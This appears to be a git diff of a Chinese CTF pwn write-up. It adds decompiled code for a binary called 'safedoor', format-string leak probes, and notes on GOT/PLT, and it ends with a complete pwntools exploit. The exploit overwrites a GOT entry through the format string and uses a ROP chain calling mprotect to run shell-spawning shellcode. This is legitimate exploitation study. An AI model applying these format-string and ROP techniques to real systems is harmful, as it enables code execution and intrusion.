@@ -8,14 +8,15 @@ category:  	writeup
 
 
 >[索引目录]  
->0x001 pwn1  
->0x002 pwn2  
->0x003 pwn3  
->0x004 pwn4(format string + mprotect)  
+>0x001 pwn1(strlen的"\x00"截断)  
+>0x002 pwn2(mmap)  
+>0x003 pwn3(数组越界)  
+>0x004 pwn4(格式化字符串 + mprotect)  
+>0x005 pwn5  
 <!-- more -->
 
 
-## 0x001 pwn1
+## 0x001 pwn1(strlen的"\x00"截断)
 
 ```
 v2 = strlen(s);
@@ -96,7 +97,7 @@ s.interactive()
 ```
 
 
-## 0x002 pwn2
+## 0x002 pwn2(mmap)
 
 ```
       switch ( v7 )
@@ -246,7 +247,7 @@ s.interactive()
 ```
 
 
-## 0x003 pwn3
+## 0x003 pwn3(数组越界)
 
 数组边界上溢
 ```
@@ -337,30 +338,130 @@ s.interactive()
 ```
 
 
-## 0x004 pwn4(format string + mprotect)
+## 0x004 pwn4(格式化字符串 + mprotect)
 
-格式化字符串
+format string漏洞
 ```
-%70$p	# format偏移70处到内存地址的内容
+int sub_80485C4()
+{
+  char s; // [esp+10h] [ebp-108h]
+  char v2; // [esp+10Fh] [ebp-9h]
+
+  setbuf(stdout, 0);
+  while ( 1 )
+  {
+    printf("KEY:");
+    fgets(&s, 0xFF, stdin);
+    v2 = 0;
+    if ( !strcmp(&s, "STjJaOEwLszsLwRy\n") )
+      break;
+    printf("ERROR:");
+    printf(&s);
+  }
+  return puts("okey,you entered it.");
+}
+```
+
+栈溢出
+```
+char *sub_804858D()
+{
+  char addr; // [esp+10h] [ebp-88h]
+
+  mprotect(&addr, 0x80u, 7);
+  return gets(&addr);
+}
 ```
 
 poc
 ```
-p = "AAAA %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x"
+%70$p	# format偏移70处到内存地址的内容
 
-ERROR:AAAA 08048705 f77895a0 f75daf12 41414141 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520
+p = "1111 %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x"
 
-偏移4
+ERROR:1111 08048705 f77895a0 f75daf12 41414141 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520
+
+偏移4，p = "1111 %4$x"
 ```
 
-验证
-```
-p = "AAAA %4$x"
-
-```
-
+翻资料时正好看到关于GOT和PLT表的，记录一下
 ```
 GOT（Global Offset Table）：全局偏移表用于记录在 ELF 文件中所用到的共享库中符号的绝对地址。在程序刚开始运行时，GOT 表项是空的，当符号第一次被调用时会动态解析符号的绝对地址然后转去执行，并将被解析符号的绝对地址记录在 GOT 中，第二次调用同一符号时，由于 GOT 中已经记录了其绝对地址，直接转去执行即可（不用重新解析）。
 
 PLT（Procedure Linkage Table）：过程链接表的作用是将位置无关的符号转移到绝对地址。当一个外部符号被调用时，PLT 去引用 GOT 中的其符号对应的绝对地址，然后转入并执行。
 ```
+
+利用gets溢出，调用mprotect，最后跳到shellcode
+```
+from pwn import *
+
+context.log_level = "debug"
+context.arch = "i386"
+
+s = process("./safedoor")
+elf = ELF("./safedoor")
+#gdb.attach(proc.pidof(s)[0], "b *0x08048645\nc\n")
+
+log.info("#--------------------------------leak stack addr")
+pause()
+#p = "1111 %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x"
+#p = "1111 %08x %08x %08x %08x"
+p = "1111 %70$x"
+
+s.recvuntil("KEY:")
+s.sendline(p)
+
+s.recvuntil("1111 ")
+data = s.recvuntil("\n")[:-1]
+ebp = int(data,16)
+stack_addr = (ebp-280) & 0xfffff000
+
+print "stack_addr: [" + hex(stack_addr) + "]"
+
+
+log.info("#--------------------------------call mprotect & system")
+pause()
+mprotect_plt = elf.plt["mprotect"]
+puts_got = elf.got["puts"]
+gets_plt = elf.plt["gets"]
+vul_addr = 0x0804858D
+pop3_ret = 0x080486cd
+
+pop_ret = 0x080483e1
+
+sh = asm(shellcraft.i386.linux.sh(), arch = "i386")
+
+print "mprotect_plt: [" + hex(mprotect_plt) + "]"
+
+for i in range(2):
+    l = (vul_addr >> (i * 8)) & 0xff
+    p = p32(puts_got + i)
+    p += "%%%dc"%(l-4)+"%4$hhn"
+
+    s.recvuntil("KEY:")
+    s.sendline(p)
+
+s.recvuntil("KEY:")
+s.sendline("STjJaOEwLszsLwRy")
+
+p = "1" * (0x88 + 4)
+p += p32(mprotect_plt)
+p += p32(pop3_ret)
+p += p32(stack_addr)
+p += p32(0xff)
+p += p32(7)
+p += p32(gets_plt)
+p += p32(pop_ret)
+p += p32(stack_addr)
+p += p32(stack_addr)    
+
+s.sendline(p)
+sleep(0.2)
+
+s.sendline(sh)
+
+s.interactive()
+```
+
+
+## 0x005 pwn5
